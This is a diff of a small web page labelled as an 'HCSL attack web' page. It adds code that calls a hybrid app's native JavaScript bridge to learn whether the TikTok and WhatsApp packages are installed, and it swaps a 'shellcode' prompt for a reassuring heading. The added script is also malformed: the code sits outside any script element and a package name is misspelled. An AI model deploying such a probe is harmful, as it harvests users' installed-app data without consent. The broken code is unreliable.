@@ -1,10 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script src="https://unpkg.com/dsbridge@3.1.3/dist/dsbridge.js"> </script>
+    var dsBridge=require("dsbridge")
+    dsBridge.call("queryAppList", {pkgNameList: "com.zhiliaoapp.musically,com.whatapp"}, function (v) {
+    alert(v);
+    })
     <meta charset="UTF-8">
     <title>This is used for HCSL attack web</title>
 </head>
 <body>
-    <h1>Please input you shellcode here.^_^</h1>
+    <h1>Don't worried,this just a .^_^</h1>
 </body>
 </html>
